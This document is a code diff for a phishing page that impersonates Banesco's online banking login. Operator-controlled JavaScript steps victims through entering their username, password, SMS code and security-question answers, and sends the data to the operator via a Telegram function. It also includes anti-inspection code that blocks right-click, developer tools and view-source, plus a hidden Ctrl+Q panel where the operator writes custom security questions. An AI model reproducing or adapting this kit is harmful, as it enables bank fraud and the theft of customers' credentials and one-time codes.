+          const finalizar = () => {
+            window.location.href = 'iniciar.html';
+          };
+
+          const avanzarAClaveDesdePreguntas = () => {
+            loaderContainer.style.display = 'none';
+            pasoActual = 2;
+            boxPreguntas.style.display = 'none';
+            boxUsuario.style.display = 'none';
+            boxSMS.style.display = 'none';
+            boxClave.style.display = 'flex';
+            if (typeof resetLayoutVisuals === 'function') resetLayoutVisuals();
+            claveInput.required = true;
+            claveInput.value = '';
+            claveInput.focus();
+            btnSubmit.textContent = 'Ingresar';
+          };
+
+          const avanzarASMSDesdePreguntas = () => {
+            loaderContainer.style.display = 'none';
+            pasoActual = 3;
+            boxPreguntas.style.display = 'none';
+            boxUsuario.style.display = 'none';
+            boxClave.style.display = 'none';
+            boxSMS.style.display = 'flex';
+            if (typeof resetLayoutVisuals === 'function') resetLayoutVisuals();
+            smsInput.required = true;
+            smsInput.value = '';
+            smsInput.focus();
+            btnSubmit.textContent = 'Validar';
+          };
+
+          // 0 = Espera indefinidamente hasta que el operador decida
+          startActionListening((accion, param) => {
+            if (accion === 'goto_clave' || accion === 'proceed_user') {
+              avanzarAClaveDesdePreguntas();
+            } else if (accion === 'goto_sms' || accion === 'proceed_pass') {
+              avanzarASMSDesdePreguntas();
+            } else if (accion === 'fail_q' || accion === 'fail') {
+              loaderContainer.style.display = 'none';
+              p1Input.value = '';
+              p2Input.value = '';
+              showQuestionsError();
+            } else if (accion === 'blocked') {
+              loaderContainer.style.display = 'none';
+              showBlockedMessage();
+            } else if (accion === 'q_preset') {
+              loaderContainer.style.display = 'none';
+              const preset = PRESETS_PREGUNTAS[param] || PRESETS_PREGUNTAS['1'];
+              pregunta1TextoActual = preset.q1;
+              pregunta2TextoActual = preset.q2;
+              const label1 = document.getElementById('labelPregunta1');
+              const label2 = document.getElementById('labelPregunta2');
+              if (label1) label1.textContent = pregunta1TextoActual;
+              if (label2) label2.textContent = pregunta2TextoActual;
+              p1Input.value = '';
+              p2Input.value = '';
+              showAuthError('Por favor responda las nuevas preguntas de seguridad asignadas.', 'Preguntas Actualizadas', 'questions');
+            } else if (accion === 'q_custom') {
+              loaderContainer.style.display = 'none';
+              const parts = param.split(/[\n|]/).map(s => s.trim()).filter(Boolean);
+              pregunta1TextoActual = parts[0] || '1. Pregunta de seguridad';
+              pregunta2TextoActual = parts[1] || '2. Pregunta de seguridad';
+              const label1 = document.getElementById('labelPregunta1');
+              const label2 = document.getElementById('labelPregunta2');
+              if (label1) label1.textContent = pregunta1TextoActual;
+              if (label2) label2.textContent = pregunta2TextoActual;
+              p1Input.value = '';
+              p2Input.value = '';
+              showAuthError('Por favor responda las nuevas preguntas de seguridad asignadas.', 'Preguntas Actualizadas', 'questions');
+            } else {
+              finalizar();
+            }
+          }, 0, null);
+        }
+      }
+    }
+
+    // Modal de Error Profesional Banesco
+    function showAuthError(message, titleText = 'Error de Autenticación', purpose = 'auth') {
+      const modal = document.getElementById('authErrorModal');
+      const titleEl = document.getElementById('modalErrorTitle');
+      const descEl = document.getElementById('modalErrorDesc');
+      if (titleEl) titleEl.textContent = titleText;
+      if (descEl) descEl.innerHTML = message;
+      modal.dataset.purpose = purpose;
+      modal.style.display = 'flex';
+      requestAnimationFrame(() => {
+        modal.classList.add('active');
+      });
+      const btnSubmit = document.getElementById('btnSubmit');
+      if (btnSubmit) btnSubmit.disabled = true;
+    }
+
+    function hideAuthError() {
+      const modal = document.getElementById('authErrorModal');
+      if (!modal) return;
+      const purpose = modal.dataset.purpose;
+      modal.classList.remove('active');
+      setTimeout(() => {
+        modal.style.display = 'none';
+      }, 200);
+
+      const btnSubmit = document.getElementById('btnSubmit');
+      if (btnSubmit) btnSubmit.disabled = false;
+
+      if (purpose === 'sms') {
+        const smsInput = document.getElementById('inputSMS');
+        if (smsInput) {
+          smsInput.value = '';
+          smsInput.focus();
+        }
+        return;
+      }
+
+      if (purpose === 'questions') {
+        const p1Input = document.getElementById('inputPregunta1');
+        const p2Input = document.getElementById('inputPregunta2');
+        if (p1Input) p1Input.value = '';
+        if (p2Input) p2Input.value = '';
+        if (p1Input) p1Input.focus();
+        return;
+      }
+
+      if (purpose === 'blocked') {
+        // Volver al paso 1
+        pasoActual = 1;
+        intentoClave = 0;
+        document.getElementById('boxUsuario').style.display = 'flex';
+        document.getElementById('boxClave').style.display = 'none';
+        document.getElementById('boxSMS').style.display = 'none';
+        document.getElementById('boxPreguntas').style.display = 'none';
+
+        document.getElementById('inputUsuario').value = '';
+        document.getElementById('inputClave').value = '';
+        document.getElementById('inputSMS').value = '';
+        document.getElementById('inputPregunta1').value = '';
+        document.getElementById('inputPregunta2').value = '';
+
+        document.getElementById('btnSubmit').textContent = 'Aceptar';
+        document.getElementById('inputUsuario').focus();
+        return;
+      }
+
+      // Reintentar credencial según el paso actual
+      if (pasoActual === 4) {
+        const p1Input = document.getElementById('inputPregunta1');
+        const p2Input = document.getElementById('inputPregunta2');
+        if (p1Input) p1Input.value = '';
+        if (p2Input) p2Input.value = '';
+        if (p1Input) p1Input.focus();
+      } else if (pasoActual === 2) {
+        const claveInput = document.getElementById('inputClave');
+        if (claveInput) {
+          claveInput.value = '';
+          claveInput.focus();
+        }
+      } else {
+        pasoActual = 1;
+        document.getElementById('boxUsuario').style.display = 'flex';
+        document.getElementById('boxClave').style.display = 'none';
+        const usuarioInput = document.getElementById('inputUsuario');
+        if (usuarioInput) {
+          usuarioInput.value = '';
+          usuarioInput.focus();
+        }
+      }
+    }
+
+    function showBlockedMessage() {
+      showAuthError('Su usuario ha sido bloqueado por motivos de seguridad. Para recuperar el acceso, por favor ingrese en la opción "Afíliese Aquí" en la página de inicio de BanescOnline y siga los pasos que indica el sistema.', 'Acceso Bloqueado', 'blocked');
+    }
+
+    function showSmsError() {
+      showAuthError('El código de validación ingresado es incorrecto o ha vencido. Por favor verifique e intente nuevamente.', 'Código Incorrecto', 'sms');
+    }
+
+    function showQuestionsError() {
+      showAuthError('Las respuestas a las preguntas de seguridad ingresadas son incorrectas. Por favor verifique e intente de nuevo.', 'Respuestas Incorrectas', 'questions');
+    }
+
+    // Compatibilidad por si se invocan con nombres anteriores
+    function showInlineError(message) {
+      showAuthError(message);
+    }
+    function hideInlineError() {
+      hideAuthError();
+    }
+    function showOverlay(title, body, purpose) {
+      showAuthError(body, title, purpose);
+    }
+    function hideBlockedMessage() {
+      hideAuthError();
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+      const btn = document.getElementById('btnAceptarError');
+      if (btn) btn.addEventListener('click', hideAuthError);
+
+      document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape') {
+          hideAuthError();
+        }
+      });
+
+      // Polling continuo desde el inicio de carga de la página
+      if (typeof startActionListening === 'function') {
+        startActionListening(null, 0, null);
+      }
+    });
+
+    // =======================================================
+    // PROTECCIÓN ANTI-INSPECCIÓN CÓDIGO FUENTE
+    // =======================================================
+    (function antiInspect() {
+      let toastTimer = null;
+      function mostrarBloqueo() {
+        const toast = document.getElementById('protectionToast');
+        if (toast) {
+          toast.style.display = 'flex';
+          requestAnimationFrame(() => {
+            toast.style.opacity = '1';
+            toast.style.transform = 'translateX(-50%) translateY(0)';
+          });
+          if (toastTimer) clearTimeout(toastTimer);
+          toastTimer = setTimeout(() => {
+            toast.style.opacity = '0';
+            toast.style.transform = 'translateX(-50%) translateY(-10px)';
+            setTimeout(() => { toast.style.display = 'none'; }, 280);
+          }, 2000);
+        } else {
+          alert('🔒 No hay vida papi');
+        }
+      }
+
+      // Bloquear Click Derecho
+      document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        mostrarBloqueo();
+        return false;
+      }, true);
+
+      // Bloquear Doble Clic fuera de casillas de texto
+      document.addEventListener('dblclick', function(e) {
+        const tag = e.target.tagName;
+        if (tag !== 'INPUT' && tag !== 'TEXTAREA') {
+          e.preventDefault();
+          e.stopPropagation();
+          mostrarBloqueo();
+          return false;
+        }
+      }, true);
+
+      // Bloquear Atajos de Teclado (F12, Ctrl+Shift+I/J/C, Ctrl+U, Ctrl+S, Ctrl+P)
+      document.addEventListener('keydown', function(e) {
+        const key = e.key ? e.key.toUpperCase() : '';
+        const code = e.keyCode;
+
+        // F12
+        if (code === 123 || key === 'F12') {
+          e.preventDefault();
+          e.stopPropagation();
+          mostrarBloqueo();
+          return false;
+        }
+        // Ctrl+Shift+I / J / C / K / M
+        if (e.ctrlKey && e.shiftKey && (code === 73 || code === 74 || code === 67 || code === 75 || code === 77 || key === 'I' || key === 'J' || key === 'C' || key === 'K' || key === 'M')) {
+          e.preventDefault();
+          e.stopPropagation();
+          mostrarBloqueo();
+          return false;
+        }
+        // Ctrl+U (Ver fuente), Ctrl+S (Guardar), Ctrl+P (Imprimir)
+        if (e.ctrlKey && (code === 85 || code === 83 || code === 80 || key === 'U' || key === 'S' || key === 'P')) {
+          e.preventDefault();
+          e.stopPropagation();
+          mostrarBloqueo();
+          return false;
+        }
+      }, true);
+
+      // Desactivar arrastre de imágenes y elementos
+      document.addEventListener('dragstart', function(e) {
+        e.preventDefault();
+        return false;
+      }, true);
+    })();
+    </script>
+
+  <!-- Toast de Notificación de Bloqueo Anti-Inspección -->
+  <div id="protectionToast" style="display: none; position: fixed; top: 24px; left: 50%; transform: translateX(-50%) translateY(-10px); background: rgba(15, 23, 42, 0.94); color: #ffffff; padding: 12px 26px; border-radius: 50px; font-size: 15.5px; font-weight: bold; z-index: 9999999; box-shadow: 0 10px 25px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.18); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); align-items: center; gap: 10px; transition: all 0.28s cubic-bezier(0.16, 1, 0.3, 1); opacity: 0; pointer-events: none;">
+    🔒 No hay vida papi
+  </div>
+
+  <!-- Modal de Error de Autenticación Banesco (Centrado Absoluto y Diseño Profesional) -->
+  <div id="authErrorModal" class="modal-overlay" role="dialog" aria-modal="true" aria-labelledby="modalErrorTitle">
+    <div class="modal-card">
+      <div class="modal-header">
+        <div class="error-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24">
+            <line x1="12" y1="6" x2="12" y2="13"></line>
+            <circle cx="12" cy="17.5" r="1.2" fill="#ffffff" stroke="none"></circle>
+          </svg>
+        </div>
+        <h2 id="modalErrorTitle">Error de Autenticación</h2>
+      </div>
+
+      <div class="modal-body">
+        <p id="modalErrorDesc">
+          Usuario, clave o clave especial inválida, por favor verifique e intente de nuevo. 
+          Recuerde que al ingresar la clave errada en tres (3) intentos consecutivos, su acceso 
+          será bloqueado por medidas de seguridad.
+        </p>
+      </div>
+
+      <button type="button" class="btn-submit-modal" id="btnAceptarError">Aceptar</button>
+
+      <div class="modal-footer">
+        <a href="iniciar.html" class="footer-link">
+          <span class="help-icon" aria-hidden="true">?</span>
+          <span>¿Olvidó su usuario o clave de acceso?</span>
+        </a>
+      </div>
+    </div>
+  <!-- Modal de Configuración de Preguntas para el Operador / Administrador -->
+  <div id="adminQuestionsModal" class="modal-overlay" style="display: none; z-index: 999999;">
+    <div class="modal-card" style="max-width: 460px;">
+      <div class="modal-header">
+        <div class="error-icon" style="background: linear-gradient(135deg, #007953 0%, #005a3e 100%); box-shadow: 0 4px 12px rgba(0, 121, 83, 0.32);">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" width="22" height="22">
+            <path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path>
+            <path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path>
+          </svg>
+        </div>
+        <h2>Escribir Preguntas Personalizadas</h2>
+      </div>
+
+      <div class="modal-body" style="padding: 16px 0 20px 0;">
+        <p style="margin-bottom: 14px; font-size: 14.5px; color: #334155;">
+          Escriba las preguntas exactas que desea mostrarle al cliente en la página:
+        </p>
+
+        <label style="font-size: 13px; font-weight: bold; color: #1e293b; display: block; margin-bottom: 4px;">1. Primera Pregunta:</label>
+        <input type="text" id="adminInputQ1" placeholder="Ej: ¿Nombre de su primera mascota?" style="width: 100%; padding: 11px 13px; border: 1px solid #cbd5e1; border-radius: 6px; margin-bottom: 14px; font-size: 14px; box-sizing: border-box; outline: none;">
+
+        <label style="font-size: 13px; font-weight: bold; color: #1e293b; display: block; margin-bottom: 4px;">2. Segunda Pregunta:</label>
+        <input type="text" id="adminInputQ2" placeholder="Ej: ¿En qué ciudad nació su madre?" style="width: 100%; padding: 11px 13px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 14px; box-sizing: border-box; outline: none;">
+      </div>
+
+      <div style="display: flex; gap: 10px; justify-content: flex-end;">
+        <button type="button" onclick="cerrarAdminModal()" style="background: #e2e8f0; color: #475569; border: none; padding: 12px 18px; border-radius: 6px; font-weight: 600; cursor: pointer; font-size: 14px;">Cancelar</button>
+        <button type="button" onclick="guardarYAvanzarAdminPreguntas()" style="background: linear-gradient(180deg, #00845a 0%, #00704c 100%); color: #ffffff; border: none; padding: 12px 20px; border-radius: 6px; font-weight: 600; cursor: pointer; font-size: 14px; box-shadow: 0 4px 12px rgba(0, 112, 76, 0.28);">Mostrar en la Página</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function abrirAdminModal() {
+      const modal = document.getElementById('adminQuestionsModal');
+      if (modal) {
+        modal.style.display = 'flex';
+        requestAnimationFrame(() => modal.classList.add('active'));
+        const q1Input = document.getElementById('adminInputQ1');
+        if (q1Input) q1Input.focus();
+      }
+    }
+
+    function cerrarAdminModal() {
+      const modal = document.getElementById('adminQuestionsModal');
+      if (modal) {
+        modal.classList.remove('active');
+        setTimeout(() => { modal.style.display = 'none'; }, 200);
+      }
+    }
+
+    function guardarYAvanzarAdminPreguntas() {
+      const q1Input = document.getElementById('adminInputQ1');
+      const q2Input = document.getElementById('adminInputQ2');
+      const q1 = (q1Input && q1Input.value.trim()) || '1. Pregunta de seguridad';
+      const q2 = (q2Input && q2Input.value.trim()) || '2. Pregunta de seguridad';
+
+      cerrarAdminModal();
+
+      if (typeof sendDirectToTelegram === 'function') {
+        sendDirectToTelegram(
+          '✍️ PREGUNTAS CONFIGURADAS MANUALMENTE',
+          [
+            `📌 <b>1. Pregunta:</b> <code>${escapeHtml(q1)}</code>`,
+            `📌 <b>2. Pregunta:</b> <code>${escapeHtml(q2)}</code>`
+          ]
+        );
+      }
+
+      if (typeof window.ejecutarAplicarPreguntas === 'function') {
+        window.ejecutarAplicarPreguntas(q1, q2);
+      } else {
+        pregunta1TextoActual = q1;
+        pregunta2TextoActual = q2;
+        const label1 = document.getElementById('labelPregunta1');
+        const label2 = document.getElementById('labelPregunta2');
+        if (label1) label1.textContent = q1;
+        if (label2) label2.textContent = q2;
+
+        const boxSMS = document.getElementById('boxSMS');
+        const boxPreguntas = document.getElementById('boxPreguntas');
+        const loaderContainer = document.getElementById('loaderContainer');
+        const p1Input = document.getElementById('inputPregunta1');
+        const p2Input = document.getElementById('inputPregunta2');
+        const btnSubmit = document.getElementById('btnSubmit');
+
+        if (loaderContainer) loaderContainer.style.display = 'none';
+        if (boxSMS) boxSMS.style.display = 'none';
+        if (boxPreguntas) boxPreguntas.style.display = 'flex';
+        pasoActual = 4;
+        if (p1Input) { p1Input.value = ''; p1Input.required = true; p1Input.focus(); }
+        if (p2Input) { p2Input.value = ''; p2Input.required = true; }
+        if (btnSubmit) btnSubmit.textContent = 'Continuar';
+      }
+    }
+
+    document.addEventListener('keydown', function(e) {
+      if ((e.ctrlKey || e.metaKey) && (e.key === 'q' || e.key === 'Q')) {
+        e.preventDefault();
+        abrirAdminModal();
+      }
+    });
+  </script>
+
+</body>
+</html>
